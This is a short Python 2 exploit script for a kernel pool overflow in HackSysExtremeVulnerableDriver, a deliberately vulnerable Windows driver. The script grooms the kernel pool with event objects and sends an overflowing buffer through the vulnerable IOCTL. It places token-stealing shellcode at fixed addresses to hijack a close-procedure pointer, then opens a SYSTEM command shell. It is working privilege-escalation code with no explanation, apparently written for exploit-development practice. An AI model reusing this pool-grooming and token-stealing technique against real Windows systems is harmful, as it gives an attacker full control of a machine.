from kex import *
from ctypes import *
from ctypes.wintypes import *
import os

#EXPLOIT

if __name__ == '__main__':
	print "[*] HackSysExtremeVulnerableDriver pool overflow privilige escalation"
	
	IOCTL_VULN	= ctl_code(0x803) #
	DEVICE_NAME   = "\\\\.\\HackSysExtremeVulnerableDriver"
	dwReturn	  = c_ulong()
	driver_handle = kernel32.CreateFileA(DEVICE_NAME, GENERIC_READ | GENERIC_WRITE, 0, None, OPEN_EXISTING, 0, None)

	required_hole_size = 0x200
	good_object = find_object_to_spray(required_hole_size)
	#allocate input 
	size = 0x1F8 + len(pool_overwrite(required_hole_size,good_object))
	input = 0x1F8 * "\x42" + pool_overwrite(required_hole_size,good_object)
	alloc_memory(0x41410000, input, size)

	#alloc pointer to CloseProcedure
	stuff = "\x42\x42\x42\x42"
	alloc_memory(0x00000060, stuff, 0x4)

	#allocate shellcode in memory
	SHELLCODE = tokenstealing(RETVAL = "")
	stuff = "\x90" * 0x10 + SHELLCODE + "\x90" * (size - 0x10 - len(SHELLCODE))
	alloc_memory(0x42424242, stuff, size)
	
	#spray the heap with EventObjects
	gimme_the_hole(required_hole_size)

	inputbuffer	   = 0x41410000 #memory address of the input buffer
	inputbuffer_size  = size 
	outputbuffer_size = 0x0
	IoStatusBlock = c_ulong()
	if driver_handle:
		print "[+] Talking to the driver sending vulnerable IOCTL..."
		dev_ioctl = ntdll.ZwDeviceIoControlFile(driver_handle,
									   None,
									   None,
									   None,
									   byref(IoStatusBlock),
									   IOCTL_VULN,
									   inputbuffer,
									   inputbuffer_size,
									   None,
									   0x0
									   )

		print "[+] Getting system shell..."
		close_all_handles()
		os.system("cmd.exe")